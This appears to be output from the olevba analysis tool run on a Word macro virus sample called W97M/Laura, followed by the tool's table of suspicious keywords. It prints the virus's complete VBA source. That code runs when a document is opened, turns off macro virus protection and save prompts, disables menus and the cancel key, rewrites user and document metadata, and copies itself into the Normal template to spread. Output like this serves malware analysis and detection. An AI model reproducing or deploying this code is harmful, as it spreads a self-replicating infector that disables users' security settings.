olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Laura
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Laura - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Laura()
    t = "W97M/Laura"
    l = "     Laura, I love you.     "
    m = "        -Total Konfuzion-"
    If Day(17) Then
        MsgBox l & vbCr & vbCr & m, vbSystemModal, t
        ActiveDocument.Shapes.AddTextEffect(msoTextEffect8, "Laura, I love you.", "Comic Sans MS", 36#, msoFalse, msoFalse, 155.6, 176.6).Select
        CommandBars("WordArt").Visible = (Rnd * 0)
        Beep
    End If
End Sub
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        t = "W97M/Laura"
        l = "Laura, I love you."
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
            .SavePropertiesPrompt = (Rnd * 0)
        End With
        With Application
            .EnableCancelKey = wdCancelDisabled
            .UserName = "Total Konfuzion"
            .UserInitials = "TK"
            .UserAddress = t & vbCr & l
        End With
        CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
        CommandBars("Tools").Controls("Templates and Add-ins...") = (Rnd * 0)
        CommandBars("Format").Controls("Style Gallery...") = (Rnd * 0)
        With Dialogs(wdDialogFileSummaryInfo)
            .Author = "Total Konfuzion"
            .Subject = "W97M/Laura"
            .Comments = "Laura, I love you"
            .Keywords = "-Total Konfuzion-"
            .Execute
        End With
        StatusBar = l
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        Call Laura
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
' W97M/Laura
'   by: Total Konfuzion
' Just to express my true love
' for you darling.. xxx
End Sub
Sub HelpAbout()
    t = "W97M/Laura"
    m = " -Total Konfuzion-"
    Application.Caption = t & "   -   " & "Laura, I love you."
    MsgBox "    " & t & vbCr & vbCr & m, vbSystemModal, t
    Dialogs(wdDialogHelpAbout).Show
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

